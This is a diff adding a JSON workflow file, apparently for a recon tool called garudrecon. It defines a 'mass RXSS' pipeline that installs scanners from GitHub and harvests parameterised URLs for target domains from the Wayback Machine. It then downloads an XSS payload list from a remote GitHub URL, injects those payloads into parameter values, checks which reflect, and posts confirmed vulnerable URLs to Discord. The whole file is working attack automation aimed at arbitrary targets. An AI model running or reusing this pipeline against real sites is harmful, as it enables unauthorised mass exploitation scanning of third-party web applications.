@@ -1,0 +1,15 @@
+[{
+  "requirements": [
+    { "bin": "urldedupe", "install": "git clone https://github.com/ameenmaali/urldedupe.git --depth 1 &>/dev/null && cd urldedupe && cmake CMakeLists.txt &>/dev/null && make &>/dev/null && mv urldedupe /usr/local/bin/ && cd .. && rm -rf urldedupe" },
+    { "bin": "xssrecon", "install": "gocl -i github.com/rix4uni/xssrecon" },
+    { "bin": "pvreplace", "install": "gocl -i github.com/rix4uni/pvreplace" },
+    { "bin": "xsschecker", "install": "gocl -i github.com/rix4uni/xsschecker" },
+    { "bin": "pyxss", "install": "pipx install --force git+https://github.com/rix4uni/pyxss.git" },
+    { "bin": "unew", "install": "gocl -i github.com/rix4uni/unew" }
+  ],
+  "command": [
+    "for target in $(cat ${INPUT});do curl -s \"https://web.archive.org/cdx/search/cdx?url=*.$target/*&output=text&fl=original&collapse=urlkey\" | urldedupe -s | grep -aE '=|%3D' | egrep -aiv '.(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)' | unew -q $target.wayback ; cat $target.wayback | xssrecon --silent --skipspecialchar --json | jq -r 'select(.reflected==true) | .baseurl' | unew -q $target.xssrecon; curl -s 'https://raw.githubusercontent.com/rix4uni/WordList/refs/heads/main/payloads/xss/favourite.txt' | unew -q favourite.txt && if grep -qv '^rix4uni' 'favourite.txt';then sed -i 's/^/rix4uni/' 'favourite.txt';fi; cat $target.xssrecon | pvreplace -silent -payload favourite.txt -fuzzing-part param-value -fuzzing-type replace -fuzzing-mode single | xsschecker -nc -match 'rix4uni' -vuln -t 100 -timeout 15 -retries 1 -filter 2>/dev/null | unew -q $target.xsschecker; cat $target.xsschecker | pyxss --silent --no-color | egrep -av 'NOT VULNERABLE:' | unew $target.${OUTPUT} | notify -duc -silent -id rxss &>/dev/null; rm -rf $target.wayback $target.xssrecon $target.xsschecker;done"
+  ],
+  "example": "garudrecon workflow kpt-massrxss-wayback -i wildcards.txt -o pyxss",
+  "description": "Mass RXSS live discord notify required 4GB ram using wayback"
+}]
